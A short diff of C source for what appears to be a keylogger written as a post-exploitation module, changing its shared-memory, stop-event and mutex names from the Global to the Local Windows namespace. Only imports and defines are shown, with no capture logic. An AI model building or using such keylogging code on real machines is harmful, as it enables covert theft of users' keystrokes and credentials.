@@ -18,9 +18,9 @@ DECLSPEC_IMPORT VOID   WINAPI KERNEL32$Sleep(DWORD);
 DECLSPEC_IMPORT BOOL   WINAPI USER32$PostThreadMessageA(DWORD, UINT, WPARAM, LPARAM);
 
 #define KEYLOG_MAGIC      0xDEADBEEF
-#define KEYLOG_MAP_NAME   "Global\\keylog_buf"
-#define KEYLOG_STOP_NAME  "Global\\keylog_stop"
-#define KEYLOG_MUTEX_NAME "Global\\keylog_mutex"
+#define KEYLOG_MAP_NAME   "Local\\keylog_buf"
+#define KEYLOG_STOP_NAME  "Local\\keylog_stop"
+#define KEYLOG_MUTEX_NAME "Local\\keylog_mutex"
 
 #pragma pack(push, 1)
 typedef struct {
